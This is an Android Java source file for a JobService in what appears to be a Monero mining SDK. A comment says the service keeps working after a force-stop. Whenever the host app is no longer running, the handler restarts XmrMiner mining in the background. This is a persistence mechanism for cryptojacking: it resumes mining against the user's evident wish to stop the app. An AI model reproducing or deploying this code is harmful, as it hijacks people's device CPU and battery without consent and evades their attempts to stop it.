package waterhole.miner.monero.keepappalive.service;

import static waterhole.miner.core.utils.LogUtils.error;
import static waterhole.miner.core.utils.LogUtils.info;

import android.annotation.TargetApi;
import android.app.Service;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import waterhole.miner.core.StateObserver;
import waterhole.miner.monero.XmrMiner;
import waterhole.miner.monero.keepappalive.utils.SystemUtils;

/**
 * JobService，支持5.0以上forcestop依然有效
 */
@TargetApi(21)
public class AliveJobService extends JobService {

    private final static String TAG = "KeepAliveService";
    // 告知编译器，这个变量不能被优化
    private volatile static Service mKeepAliveService = null;

    public static boolean isJobServiceAlive() {
        return mKeepAliveService != null;
    }

    private static final int MESSAGE_ID_TASK = 0x01;

    private Handler mHandler = new Handler(new Handler.Callback() {
        @Override
        public boolean handleMessage(Message msg) {
            // 具体任务逻辑
            if (!SystemUtils.isAPPALive(getApplicationContext()) && !XmrMiner.instance().isMining()) {
                XmrMiner.instance().init(getApplicationContext()).setStateObserver(new StateObserver() {

                    @Override
                    public void onConnectPoolBegin() {
                        info("onConnectPoolBegin");
                    }

                    @Override
                    public void onConnectPoolSuccess() {
                        info("onConnectPoolSuccess");
                    }

                    @Override
                    public void onConnectPoolFail(String error) {
                        error("onConnectPoolFail: " + error);
                    }

                    @Override
                    public void onPoolDisconnect(String error) {
                        error("onPoolDisconnect: " + error);
                    }

                    @Override
                    public void onMessageFromPool(String message) {
                        info("onMessageFromPool: " + message);
                    }

                    @Override
                    public void onMiningError(String error) {
                        error("onMiningError = " + error);
                    }

                    @Override
                    public void onMiningStatus(double speed) {
                        info("onMiningStatus speed = " + speed);
                    }
                }).startMine();
            }
            // 通知系统任务执行结束
            jobFinished((JobParameters) msg.obj, false);
            return true;
        }
    });

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.d(TAG, "KeepAliveService----->JobService服务被启动...");
        mKeepAliveService = this;
        // 返回false，系统假设这个方法返回时任务已经执行完毕；
        // 返回true，系统假定这个任务正要被执行
        Message msg = Message.obtain(mHandler, MESSAGE_ID_TASK, params);
        mHandler.sendMessage(msg);
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        mHandler.removeMessages(MESSAGE_ID_TASK);
        Log.d(TAG, "KeepAliveService----->JobService服务被关闭");
        return false;
    }
}
